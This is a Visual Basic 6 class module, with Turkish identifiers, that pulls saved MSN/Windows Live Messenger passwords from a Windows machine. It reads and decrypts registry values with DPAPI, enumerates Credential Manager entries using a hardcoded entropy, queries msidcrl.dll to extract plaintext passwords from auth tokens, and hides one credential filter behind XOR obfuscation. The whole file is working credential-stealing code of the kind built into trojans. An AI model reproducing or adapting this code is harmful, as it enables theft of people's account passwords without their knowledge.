VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "msnpwds"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Option Explicit
Private Enum CRED_TYPE
GENERIC = 1
DOMAIN_PASSWORD
DOMAIN_CERTIFICATE
DOMAIN_VISIBLE_PASSWORD
MAXIMUM
End Enum
Private Const ERROR_SUCCESS As Long = 0&
Private Const HKEY_CURRENT_USER As Long = &H80000001
Private Const READ_CONTROL As Long = &H20000
Private Const STANDARD_RIGHTS_READ As Long = (READ_CONTROL)
Private Const KEY_QUERY_VALUE As Long = &H1
Private Const KEY_ENUMERATE_SUB_KEYS As Long = &H8
Private Const KEY_NOTIFY As Long = &H10
Private Const SYNCHRONIZE As Long = &H100000
Private Const STANDARD_RIGHTS_WRITE As Long = (READ_CONTROL)
Private Const KEY_SET_VALUE As Long = &H2
Private Const KEY_CREATE_SUB_KEY As Long = &H4
Private Const KEY_READ As Long = ((STANDARD_RIGHTS_READ Or KEY_QUERY_VALUE Or KEY_ENUMERATE_SUB_KEYS Or KEY_NOTIFY) And (Not SYNCHRONIZE))
Private Const KEY_WRITE As Long = ((STANDARD_RIGHTS_WRITE Or KEY_SET_VALUE Or KEY_CREATE_SUB_KEY) And (Not SYNCHRONIZE))
Private Type DATA_BLOB
    cbData As Long
    pbData As Long
End Type
Private Type FILETIME
    dwLowDateTime As Long
    dwHighDateTime As Long
End Type
Private Type CREDENTIAL_ATTRIBUTE
    lpstrKeyword As Long
    dwFlags As Long
    dwValueSize As Long
    lpbValue As Long
End Type
Private Type CREDENTIAL
    dwFlags As Long
    dwType As Long
    lpstrTargetName As Long
    lpstrComment As Long
    ftLastWritten As FILETIME
    dwCredentialBlobSize As Long
    lpbCredentialBlob As Long
    dwPersist As Long
    dwAttributeCount As Long
    lpAttributes As Long
    lpstrTargetAlias As Long
    lpUserName As Long
End Type
Private Declare Function lstrlen Lib "kernel32.dll" Alias "lstrlenA" (ByVal lpString As String) As Long
Private Declare Function CredEnumerate Lib "ADVAPI32.dll" Alias "CredEnumerateW" ( _
  ByVal lpszFilter As Long, _
  ByVal lFlags As Long, _
  ByRef pCount As Long, _
  ByRef lppCredentials As Long) As Long
Private Declare Function CredDelete Lib "ADVAPI32.dll" Alias "CredDeleteW" ( _
  ByVal lpwstrTargetName As Long, _
  ByVal dwType As Long, _
  ByVal dwFlags As Long) As Long
Private Declare Function CredFree Lib "ADVAPI32.dll" (ByVal pBuffer As Long) As Long
Private Declare Function CryptUnprotectData Lib "crypt32.dll" (ByRef pDataIn As DATA_BLOB, ByVal ppszDataDescr As Long, ByVal pOptionalEntropy As Long, ByVal pvReserved As Long, ByVal pPromptStruct As Long, ByVal dwFlags As Long, ByRef pDataOut As DATA_BLOB) As Long
Private Declare Function RegOpenKeyEx Lib "ADVAPI32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, ByRef phkResult As Long) As Long
Private Declare Function RegQueryValueEx Lib "ADVAPI32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, ByRef lpType As Long, ByRef lpData As Any, ByRef lpcbData As Long) As Long
Private Declare Function RegDeleteValue Lib "ADVAPI32.dll" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName As String) As Long
Private Declare Function LocalFree Lib "kernel32.dll" (ByVal hMem As Long) As Long
Private Declare Function RegCloseKey Lib "ADVAPI32.dll" (ByVal hKey As Long) As Long
Private Declare Sub CopyMemory Lib "kernel32.dll" Alias "RtlMoveMemory" (ByRef Destination As Any, ByRef Source As Any, ByVal Length As Long)
Private Declare Function SysAllocString Lib "oleaut32.dll" (ByVal pOlechar As Long) As String
Private Const LMEM_FIXED As Long = &H0
Private Const LMEM_ZEROINIT As Long = &H40
Private Const LPTR As Long = (LMEM_FIXED + LMEM_ZEROINIT)
Private Declare Function LocalAlloc Lib "kernel32.dll" (ByVal wFlags As Long, ByVal wBytes As Long) As Long
Private Const CSIDL_PROGRAM_FILES As Long = &H26
Private Declare Function SHGetSpecialFolderLocation Lib "shell32.dll" _
(ByVal hwndOwner As Long, ByVal nFolder As Long, _
 pidl As Long) As Long
Private Declare Function SHGetPathFromIDList Lib "shell32.dll" Alias "SHGetPathFromIDListA" _
(ByVal pidl As Long, ByVal pszPath As String) As Long

Private Type UUID
    Data1 As Long
    Data2 As Integer
    Data3 As Integer
    Data4(7) As Byte
End Type
Private Declare Function Initialize Lib "msidcrl.dll" (ByRef guid As UUID, ByVal IDCRLVersion As Long, ByVal dwFlags As Long) As Long
Private Declare Function EnumIdentitiesWithCachedCredentials Lib "msidcrl.dll" (ByVal wszCachedCredType As Long, ByRef phEnumHandle As Long) As Long
Private Declare Function NextIdentity Lib "msidcrl.dll" (ByVal hEnumHandle As Long, ByRef lpwszMemberName As Long) As Long
Private Declare Function PassportFreeMemory Lib "msidcrl.dll" (ByVal ptr As Long) As Long
Private Declare Function CloseEnumIdentitiesHandle Lib "msidcrl.dll" (ByVal hEnumHandle As Long) As Long
Private Declare Function CreateIdentityHandle Lib "msidcrl.dll" (ByVal wszMemberName As Long, ByVal dwFlags As Long, ByRef lphExternalIdentity As Long) As Long
Private Declare Function HasPersistedCredential Lib "msidcrl.dll" (ByVal hExternalIdentity As Long, ByVal wszCredType As Long, ByRef lpbPersisted As Long) As Long
Private Declare Function RemovePersistedCredential Lib "msidcrl.dll" (ByVal hExternalIdentity As Long, ByVal wszCredType As Long) As Long
Private Declare Function GetIdentityPropertyByName Lib "msidcrl.dll" (ByVal hExternalIdentity As Long, ByVal wszPropertyName As Long, ByRef lpszValue As Long) As Long
Private Declare Function BuildAuthTokenRequest Lib "msidcrl.dll" (ByVal hExternalIdentity As Long, ByVal wszPolicy As Long, ByVal dwFlags As Long, ByRef lpReturn As Long) As Long
Private Declare Function CloseIdentityHandle Lib "msidcrl.dll" (ByVal hExternalIdentity As Long) As Long
Private Declare Function Uninitialize Lib "msidcrl.dll" () As Long
Private Declare Function LoadLibrary Lib "kernel32.dll" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As Long
Private Declare Function FreeLibrary Lib "kernel32.dll" (ByVal hLibModule As Long) As Long
Private Type OSVERSIONINFO
    dwOSVersionInfoSize As Long
    dwMajorVersion As Long
    dwMinorVersion As Long
    dwBuildNumber As Long
    dwPlatformId As Long
    szCSDVersion As String * 128
End Type
Private Declare Function GetVersionEx Lib "kernel32.dll" Alias "GetVersionExA" (ByRef lpVersionInformation As OSVERSIONINFO) As Long
Private Type msnsifresi
    strLogin As String
    strPass As String
    strTargetName As String
End Type
Private m_MSNPass() As msnsifresi
Public Function IsWindowsXPAndLater() As Boolean
    Dim os As OSVERSIONINFO
    os.dwOSVersionInfoSize = Len(os)
    GetVersionEx os
    IsWindowsXPAndLater = (os.dwPlatformId = 2) And (((os.dwMinorVersion > 0) And (os.dwMajorVersion = 5)) Or (os.dwMajorVersion > 5))
End Function
Private Static Function metinkopyala(ByVal ptr As Long) As String
    If ptr Then
metinkopyala = StrConv(SysAllocString(ptr), vbFromUnicode)
    Else
metinkopyala = vbNullString
    End If
End Function
Private Function getProgramFilesFolderPath() As String
    Dim lRet As Long, pidl As Long, sPath As String
    lRet = SHGetSpecialFolderLocation(0&, CSIDL_PROGRAM_FILES, pidl)
    If lRet = 0 Then
sPath = String$(512, vbNullChar)
lRet = SHGetPathFromIDList(pidl, sPath)
getProgramFilesFolderPath = Left$(sPath, InStr(sPath, Chr$(0)) - 1)
    Else
getProgramFilesFolderPath = vbNullString
    End If
    LocalFree pidl
End Function
Private Sub getMSN75Passwords(ByRef ub As Long)
Dim szMSNPath As String, hMod As Long
szMSNPath = getProgramFilesFolderPath() & "\MSN Messenger\msidcrl.dll"
If Dir$(szMSNPath) <> vbNullString Then
    hMod = LoadLibrary(szMSNPath)
    
    Dim g As UUID
    
    With g
.Data1 = &H7108E71A
.Data2 = &H9926
.Data3 = &H4FCB
.Data4(0) = &HBC
.Data4(1) = &HC9
.Data4(2) = &H9A
.Data4(3) = &H9D
.Data4(4) = &H3F
.Data4(5) = &H32
.Data4(6) = &HE4
.Data4(7) = &H23
    End With
    Call Initialize(g, 1, 15)
    Dim hEnum As Long
    Dim ptrEmail As Long
    Dim bPersist As Long
    Dim ptrAuth As Long, auth As String
    Dim ret As Long, posend As Long, posstart As Long
    Dim hIdent As Long
    ret = EnumIdentitiesWithCachedCredentials(StrPtr("ps:password"), hEnum)
    If (ret = 0) Then
ret = NextIdentity(hEnum, ptrEmail)
Do While ret = 0
ret = CreateIdentityHandle(ptrEmail, 255, hIdent)
If (ret = 0) And (ptrEmail <> 0) Then
    ret = HasPersistedCredential(hIdent, StrPtr("ps:password"), bPersist)
    If (ret = 0) And (bPersist <> 0) Then
ret = BuildAuthTokenRequest(hIdent, StrPtr("ps:password"), 0, ptrAuth)
If (ret = 0) Then
auth = metinkopyala(ptrAuth)
posstart = InStr(auth, "<wsse:Password>") + 15
posend = InStr(auth, "</wsse:Password>")
If (posend > 0) Then
    ReDim Preserve m_MSNPass(ub)
    With m_MSNPass(ub)
   .strLogin = metinkopyala(ptrEmail)
   .strPass = Mid$(auth, posstart, posend - posstart)
   .strTargetName = "ps:" & .strLogin
    End With
    ub = ub + 1
End If
End If
If (ptrAuth) Then
Call PassportFreeMemory(ptrAuth)
End If
    End If
    ret = CloseIdentityHandle(hIdent)
End If
If (ptrEmail) Then
    Call PassportFreeMemory(ptrEmail)
End If
ret = NextIdentity(hEnum, ptrEmail)
Loop
    End If
    Call CloseEnumIdentitiesHandle(hEnum)
    ret = EnumIdentitiesWithCachedCredentials(StrPtr("ps:membernameonly"), hEnum)
    If (ret = 0) Then
ret = NextIdentity(hEnum, ptrEmail)
Do While ret = 0
ret = CreateIdentityHandle(ptrEmail, 255, hIdent)
If (ret = 0) And (ptrEmail <> 0) Then
    ret = HasPersistedCredential(hIdent, StrPtr("ps:password"), bPersist)
    If (ret = 0) And (bPersist = 0) Then
ReDim Preserve m_MSNPass(ub)
With m_MSNPass(ub)
.strLogin = metinkopyala(ptrEmail)
.strPass = ""
.strTargetName = "ps:" & .strLogin
End With
ub = ub + 1
    End If
    ret = CloseIdentityHandle(hIdent)
End If
If (ptrEmail) Then
    Call PassportFreeMemory(ptrEmail)
End If

ret = NextIdentity(hEnum, ptrEmail)
Loop
    End If
    Call CloseEnumIdentitiesHandle(hEnum)
    Call Uninitialize
    Call FreeLibrary(hMod)
End If
End Sub
Public Sub Refresh()
Dim ret As Long
Dim hKey As Long
Dim dwType As Long
Dim Data() As Byte
Dim dwSize As Long
Dim b64string As String
Dim str As String
Dim dataIn As DATA_BLOB
Dim dataOut As DATA_BLOB
Dim szOut As String
Dim dwNbCred As Long
Dim i As Long, ptr As Long
Dim lpCredentials As Long, Cred As CREDENTIAL
Dim Entropy As DATA_BLOB
Dim ub As Long
Erase m_MSNPass
ub = 0
ret = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\Microsoft\MessengerService", 0, KEY_READ, hKey)
dwSize = 0
ret = RegQueryValueEx(hKey, "PasswordMSN Messenger Service", ByVal 0&, dwType, ByVal 0&, dwSize)
If dwSize Then
    ReDim Data(dwSize - 1)
    ret = RegQueryValueEx( _
hKey, _
"PasswordMSN Messenger Service", _
ByVal 0&, _
dwType, _
ByVal VarPtr(Data(0)), _
dwSize)
    str = StrConv(Data, vbUnicode)
    str = Mid$(str, 1, Len(str) - 1)
    ReDim m_MSNPass(0)
    With m_MSNPass(0)
.strPass = Base64Dec(str)
dwSize = 0
ret = RegQueryValueEx( _
hKey, _
"UserMSN Messenger Service", _
ByVal 0&, _
dwType, _
ByVal 0&, _
dwSize)
ReDim Data(dwSize - 1)
ret = RegQueryValueEx( _
hKey, _
"UserMSN Messenger Service", _
ByVal 0&, _
dwType, _
ByVal VarPtr(Data(0)), _
dwSize)
.strLogin = StrConv(Data, vbUnicode)
.strLogin = Mid$(.strLogin, 1, Len(.strLogin) - 1)
    End With
    ub = ub + 1
    RegCloseKey hKey
End If
RegCloseKey hKey
ret = RegOpenKeyEx( _
    HKEY_CURRENT_USER, _
    "Software\Microsoft\MSNMessenger", _
    0, _
    KEY_READ, _
    hKey)
If ret = ERROR_SUCCESS Then
    dwSize = 0
    ret = RegQueryValueEx( _
hKey, _
"Password.NET Messenger Service", _
ByVal 0&, _
dwType, _
ByVal 0&, _
dwSize)
    If ret = ERROR_SUCCESS Then
ReDim Data(dwSize - 1)
ret = RegQueryValueEx( _
hKey, _
"Password.NET Messenger Service", _
ByVal 0&, _
dwType, _
ByVal VarPtr(Data(0)), _
dwSize)
If ret <> ERROR_SUCCESS Then Exit Sub
ReDim Preserve m_MSNPass(ub)
dataIn.pbData = VarPtr(Data(0)) + 2
dataIn.cbData = dwSize - 2
Call CryptUnprotectData( _
dataIn, _
ByVal 0&, _
ByVal 0&, ByVal 0&, ByVal 0&, 1, dataOut)
b64string = Space(dataOut.cbData \ 2)
CopyMemory ByVal StrPtr(b64string), ByVal dataOut.pbData, dataOut.cbData
b64string = StrConv(b64string, vbUnicode)
With m_MSNPass(ub)
.strPass = Base64Dec(b64string)
dwSize = 0
ret = RegQueryValueEx( _
    hKey, _
    "User.NET Messenger Service", _
    ByVal 0&, _
    dwType, _
    ByVal 0&, _
    dwSize)
ReDim Data(dwSize - 1)
ret = RegQueryValueEx( _
    hKey, _
    "User.NET Messenger Service", _
    ByVal 0&, _
    dwType, _
    ByVal VarPtr(Data(0)), _
    dwSize)
.strLogin = StrConv(Data, vbUnicode)
.strLogin = Mid$(.strLogin, 1, Len(.strLogin) - 1)
End With
ub = ub + 1
LocalFree dataOut.pbData
    End If
End If
RegCloseKey hKey
If IsWindowsXPAndLater Then
    str = "Passport.Net\*"
    Call CredEnumerate(StrPtr(str), 0, dwNbCred, lpCredentials)
    If dwNbCred Then
Entropy.cbData = 74
Dim iBufEntropy(36) As Integer
Dim guid As String
guid = "82BD0E67-9FEA-4748-8672-D5EFE5B779B0" & vbNullChar
Dim k As Long
For k = 0 To 36
iBufEntropy(k) = CInt(Asc(Mid(guid, k + 1, 1)) * 4)
Next
Entropy.pbData = VarPtr(iBufEntropy(0))
ReDim Preserve m_MSNPass(ub + dwNbCred - 1)
For i = ub To ub + dwNbCred - 1
CopyMemory ByVal VarPtr(ptr), ByVal lpCredentials + (i - ub) * 4, 4&
CopyMemory ByVal VarPtr(Cred), ByVal ptr, LenB(Cred)
dataIn.pbData = Cred.lpbCredentialBlob
dataIn.cbData = Cred.dwCredentialBlobSize
dataOut.cbData = 0
dataOut.pbData = 0
Call CryptUnprotectData( _
dataIn, _
ByVal 0&, _
ByVal VarPtr(Entropy), _
ByVal 0&, _
ByVal 0&, 0, dataOut)
szOut = Space(dataOut.cbData \ 2 - 1)
CopyMemory ByVal StrPtr(szOut), ByVal dataOut.pbData, dataOut.cbData
With m_MSNPass(i)
    .strLogin = metinkopyala(Cred.lpUserName)
    .strTargetName = metinkopyala(Cred.lpstrTargetName)
    .strPass = szOut
End With
LocalFree dataOut.pbData
Next
ub = ub + dwNbCred
    End If
    CredFree lpCredentials
End If
getMSN75Passwords ub
If IsWindowsXPAndLater Then
    Dim az(17) As Byte, er As Byte, ty As Long
    az(0) = &H26: az(1) = &H30: az(2) = &H6F: az(3) = &H66: az(4) = &H51: az(5) = &H65: az(6) = &H38: az(7) = &H52: az(8) = &H62: az(9) = &H6C: az(10) = &H4E: az(11) = &H64: az(12) = &H67: az(13) = &H6E: az(14) = &H5A: az(15) = &H53: az(16) = &H55: az(17) = &H4A
    ty = LocalAlloc(LPTR, 38)
    
    For i = 0 To 17
er = (az(17 - i) Xor 12) + (17 - i)
CopyMemory ByVal ty + (i * 2), er, 1&
    Next
    Call CredEnumerate( _
      ty, _
      0, _
      dwNbCred, _
      lpCredentials _
      )
    If dwNbCred Then
ReDim Preserve m_MSNPass(ub + dwNbCred - 1)
For i = ub To ub + dwNbCred - 1
CopyMemory ByVal VarPtr(ptr), ByVal lpCredentials + (i - ub) * 4, 4&
CopyMemory ByVal VarPtr(Cred), ByVal ptr, LenB(Cred)
dataIn.pbData = Cred.lpbCredentialBlob
dataIn.cbData = Cred.dwCredentialBlobSize
Call CryptUnprotectData(dataIn, 0&, 0&, 0&, 0&, 1&, dataOut)
dataOut.pbData = dataIn.pbData
With m_MSNPass(i)
    .strLogin = metinkopyala(Cred.lpUserName)
    .strTargetName = metinkopyala(Cred.lpstrTargetName)
    .strPass = Space(dataIn.cbData \ 2)
    CopyMemory ByVal StrPtr(.strPass), ByVal dataOut.pbData, dataIn.cbData
End With
Next
ub = ub + dwNbCred
    End If
    CredFree lpCredentials
    LocalFree ty
End If
End Sub
Private Function Base64Dec(Base64String As String) As String
  Static Enc() As Byte
  Dim b() As Byte, Out() As Byte, i&, j&, L&, Dec(0 To 255) As Byte
  If (Not Val(Not Enc)) = 0 Then
    Enc = StrConv("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", vbFromUnicode)
  End If
  For i = 0 To 255: Dec(i) = 64: Next
  For i = 0 To 63: Dec(Enc(i)) = i: Next
  L = Len(Base64String): b = StrConv(Base64String, vbFromUnicode)
  ReDim Preserve Out(0 To (L \ 4) * 3 - 1)
  For i = 0 To UBound(b) Step 4
    Out(j) = (Dec(b(i)) * 4) Or (Dec(b(i + 1)) \ 16): j = j + 1
    Out(j) = (Dec(b(i + 1)) And 15) * 16 Or (Dec(b(i + 2)) \ 4): j = j + 1
    Out(j) = (Dec(b(i + 2)) And 3) * 64 Or Dec(b(i + 3)): j = j + 1
  Next i
  If b(L - 2) = 61 Then j = 2 Else If b(L - 1) = 61 Then j = 1 Else j = 0
  ReDim Preserve Out(0 To UBound(Out) - j)
  Base64Dec = StrConv(Out, vbUnicode)
End Function
Public Function NewEnum() As IEnumVARIANT
Attribute NewEnum.VB_UserMemId = -4
    Set NewEnum = InitCollection(Me)
    Refresh
End Function
Public Property Get Item(ByVal Index As Long) As msnpwd
If (Index < 0) Or (Index >= Count) Then Exit Property
Dim msnp As msnsifresi
Dim msn As New msnpwd
msnp = m_MSNPass(Index)
msn.Init msnp.strLogin, msnp.strPass, msnp.strTargetName
Set Item = msn
Set msn = Nothing
End Property
Public Function ForEach(ByVal iCurrent As Long, var As Variant) As Long
Set var = Item(iCurrent)
If var Is Nothing Then ForEach = 1 Else ForEach = 0
End Function
Public Property Get Count() As Long
On Error GoTo Fin
Count = 0
Count = UBound(m_MSNPass) + 1
Fin:
End Property
